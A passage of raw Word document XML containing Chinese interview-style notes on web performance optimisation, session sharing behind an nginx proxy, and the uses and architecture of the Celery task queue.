          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>头中的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> cache-control </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> expires </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的属性，可设定浏览器缓存，缓存时间可以自定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F88E29F" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>css</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">javascript </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件进行压缩，减少网络的通信量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016AD5D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后端优化：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9A580B" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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合理的使用缓存技术，对一些常用到的动态数据，比如首页做一个缓存，或者某些常用的数据做个缓存，设置一定得过期时间，这样减少了对数据库的压力，提升网站性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E308E05" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> celery </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>消息队列，将耗时的操作扔到队列里，让</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> worker </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>去监听队列里的任务，实现异步操作，比如发邮件，发短信。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C503BF" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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就是代码上的一些优化，补充：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">nginx </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>部署项目也是项目优化，可以配置合适的配置参数，提升效率，增加并发量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2D9D7D" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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如果太多考虑安全因素，服务器磁盘用固态硬盘读写，远远大于机械硬盘，这个技术现在没有普及，主要是固态硬盘技术上还不是完全成熟，</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相信以后会大量普及。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CFF9BDA" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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服务器横向扩展。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="550AD30F"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0"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>03.Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>中当用户登录到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>服务器进入登陆状态，下次被</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>代理到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>服务器会出现什么影响</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4FD0A0"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如果用户在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>应用服务器登陆的</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数据没有共享到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>应用服务器，那么之前的登录状态就没有了。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60034C5C"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04.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>谈谈对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Celery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的理解</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7995552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lastRenderedPageBreak/>
        <w:t>Celery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是由</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开发、简单、灵活、可靠的分布式任务队列，</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其本质是生产者消费者模型，生产者发送任务到消息队列，消费者负责处理任务。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>== Celery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>侧重于实时操作，但对调度支持也很好，其每天可以处理数以百万计的任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F0193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特点：</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简单：熟悉</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的工作流程后，配置使用简单</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高可用：当任务执行失败或执行过程中发生连接中断，</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会自动尝试重新执行任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460577B4" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00024E97">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>快速：一个单进程的</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每分钟可处理上百万个任务</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACE0AE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灵活：几乎</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的各个组件都可以被扩展及自定制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:hyperlink r:id="rId40" w:history="1"/>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="2D8644CC"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05.Celery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>有哪些应用场景</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130A1503" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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异步任务：当用户在网站进行某个操作需要很长时间完成时，我们可以将这种操作交给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Celery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>执行，直接返回给用户，等到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Celery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>执行完成以后通知用户，大大提好网站的并发以及用户的体验感。例如：发送验证邮件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D4D1D6" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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定时任务：向定时清除沉余数据或批量在几百台机器执行某些命令或者任务，此时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Celery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>可以轻松搞定。</w:t>
      </w:r>
      <w:hyperlink r:id="rId41" w:history="1"/>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="7382A5A1"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06.Celery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的工作原理是什么</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7618F5BD" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00077AF1">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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由以下三部分构成：消息中间件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(Broker)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、任务执行单元</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Worker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、结果存储</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(Backend)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，如下图：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="宋体" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3F5FEB8F" wp14:editId="5DDCAE81">
            <wp:extent cx="3025140" cy="3092450"/>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050890" cy="3118843"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3698555D"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工作原理</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任务模块</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Task</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>包含异步任务和定时任务。其中，异步任务通常在业务逻辑中被触发并发往消息队列，而定时任务由</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Celery Beat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>进程周期性地将任务发往消息队列；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0F947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color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>任务执行单元</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Worker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>实时监视消息队列获取队列中的任务执行；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
